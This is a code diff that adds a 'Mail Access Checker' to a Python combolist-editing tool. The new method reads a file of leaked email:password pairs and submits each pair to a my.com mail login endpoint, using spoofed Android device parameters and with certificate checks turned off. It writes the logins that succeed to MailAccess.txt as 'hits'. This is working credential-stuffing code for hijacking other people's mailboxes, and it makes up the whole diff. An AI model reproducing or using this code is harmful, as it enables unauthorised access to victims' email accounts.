@@ -5,7 +5,8 @@ import threading
 import tkinter as tk
 from tkinter import filedialog
 from colored import fg
-
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
 class Editor:
 
@@ -177,7 +178,36 @@ class Editor:
         else:
             self.UpperLowerFirst()
 
-
+    def MailChecker(self):
+        """7Check for valid mail access"""
+        self.Clear()
+        methods = ['Mail Access Checker', 'Back']
+        print(f'{self.__ico}\n\n{fg("#8B0000")} > {fg("#303030")} {self.__message}\n')
+        print('\n'.join([f'{self.__SecondaryColor}[{self.__PrimaryColor}{methods.index(b) + 1}{self.__SecondaryColor}] {b.split("|")[0]}' for b in methods]))
+        print(f'{self.__PrimaryColor}\nroot@extrem{self.__SecondaryColor}# ', end="")
+        choice = input()
+        if choice == "1":
+            choose = input("Enter Combolist File: ")
+            self.Clear()
+            print(f'{self.__ico}\n\n{fg("#00FF00")} > {fg("#00FF00")}This method takes a while please be patient !')
+            f = open(choose, 'r')
+            for i in open(choose, 'r').read().split('\n'):
+                fullmail = f.readline().split('\n')[0]
+                username = fullmail.split(':')[0]
+                password = fullmail.split(':')[1]
+                url = 'https://aj-https.my.com/cgi-bin/auth?Lang=en_US&mp=android&mmp=mail&DeviceID=&client=mobile&udid=&instanceid=cEHwYCtZfcM&playservices=212116037&connectid=&os=Android&os_version=10&ver=com.my.mail13.13.1.33372&appbuild=33372&vendor=Xiaomi&model=Redmi%20Note%209S&device_type=tablet&country=US&language=en_US&timezone=GMT%2B02%3A00&device_name=Xiaomi%20Redmi%20Note%209S&DeviceInfo=%7B%22OS%22%3A%22Android%22%2C%22AppVersion%22%3A%22com.my.mail13.13.1.33372%22%2C%22AppBuild%22%3A%2233372%22%2C%22Device%22%3A%22Redmi%20Note%209S%22%2C%22Timezone%22%3A%22GMT%2B02%3A00%22%2C%22DeviceName%22%3A%22Xiaomi%20Redmi%20Note%209S%22%2C%22Useragent%22%3A%22Mozilla%5C%2F5.0%20(Linux%3B%20Android%2010%3B%20Redmi%20Note%209S%20Build%5C%2FQKQ1.191215.002%3B%20wv)%20AppleWebKit%5C%2F537.36%20(KHTML%2C%20like%20Gecko)%20Version%5C%2F4.0%20Chrome%5C%2F91.0.4472.120%20Mobile%20Safari%5C%2F537.36%22%2C%22playservices%22%3A%22212116037%22%2C%22connectid%22%3A%224a93e679058284a39a7d6da21038cf5b%22%7D&idfa=<idfa>&appsflyerid=&current=google&first=google&md5_signature=<ms>'
+                data = {'Password': password, 'oauth2': '0', 'Login': username, 'mobile': '1', 'mob_json': '1', 'simple': '1', 'useragent': 'android', 'md5_post_signature': 'defbd7686b82ef1f17d3a1145aac0263'}
+                headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2735.10 Safari/537.36'}
+                ckrr = requests.post(url, headers=headers, data=data, verify=False)
+                if '"Ok=1"' in ckrr.text:
+                    print(f' \033[0;32mHit \033[0;37m: \033[0;32m{username}\033[0;37m:\033[0;32m{password}')
+                    saverez = open('MailAccess.txt', 'a')
+                    saverez.write(username+':'+password+'\n')
+                elif '"Ok=0"' in ckrr.text:
+                    print(f' \033[0;31mFail \033[0;37m: \033[0;31m{username}\033[0;37m:\033[0;31m{password}')
+                else:
+                    self.menu()
+            
     def Clear(self):
         if os.name == "nt":
             os.system("cls")
